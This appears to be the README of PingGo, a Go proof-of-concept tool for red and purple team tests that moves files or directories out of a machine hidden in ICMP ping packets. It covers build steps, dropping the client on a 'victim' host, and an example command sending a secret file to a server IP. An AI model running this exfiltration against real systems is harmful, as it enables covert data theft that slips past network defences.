# PingGo

![PingGo](img/PingGo.png)

PingGo is a simple ICMP exfiltration proof-of-concept tool designed for red and/or purple team tests. The tool, which consists of a separate server and client, can send a file or the contents of a directory to a target server using ICMP Echo packets (i.e., ping requests).

This tool was inspired by the [ICMP-TransferTools](https://github.com/icyguider/ICMP-TransferTools/tree/main) project, and was developed using assistance from generative AI. 

# Quick Start

## Server 

Clone the repo and start the server:

```
git clone 
cd PingGo/server
go run server.go 
```

By default, received files will be saved in the current directory (from which the server is being run).

## Client

You'll probably want to compile it and drop the binary on the "victim"/test client machine. From your development machine:

```
git clone
cd PingGo/client
GOOS=<client_OS> go build .

# E.g., for a Windows client:
# GOOS=windows go build .
```

Then drop the output binary on the client machine, and run:

```
# Send a single file
<path_to_output_binary> -t <server_ip> -f <file_to_send>

# Send contents of a directory
<path_to_output_binary> -t <server_ip> -d <directory>
```

Example (on a Windows client):

```
.\icmpClient.exe -t "192.168.86.10" -f "C:\super_secret_file.txt"
```

# Full Usage

## Server

```
$ ./icmpServer -h         
Usage: ./icmpServer [OPTIONS]

DESCRIPTION
    

OPTIONS
    -h, --help
        Display this help message.

    -o, --outDir=STRING
        Directory to write received files

    -t, --timeout=INT
        Seconds to wait after first block before timing out
```

## Client

E.g., from a Windows client:

```
> .\icmpClient.exe -h
Usage: \path\to\icmpClient.exe [OPTIONS]

DESCRIPTION


OPTIONS
    -b, --block=INT
        Block size (in bytes) per ICMP packet

    -d, --directory=STRING
        Path to directory with files to send - NOTE: you cannot pass both a
        directory AND a file

    -f, --file=STRING
        Path to the file to send - NOTE: you cannot pass both a directory AND a
        file

    -h, --help
        Display this help message.

    -t, --target=STRING
        IP address of the target server where the data will be sent
```

# Credits

- As mentioned above, this tool was inspired by the [ICMP-TransferTools](https://github.com/icyguider/ICMP-TransferTools/tree/main) project
- As usual, thanks to [mjwhitta](https://github.com/mjwhitta) for the help and mentoring
- Claude Code was used for assistance from AI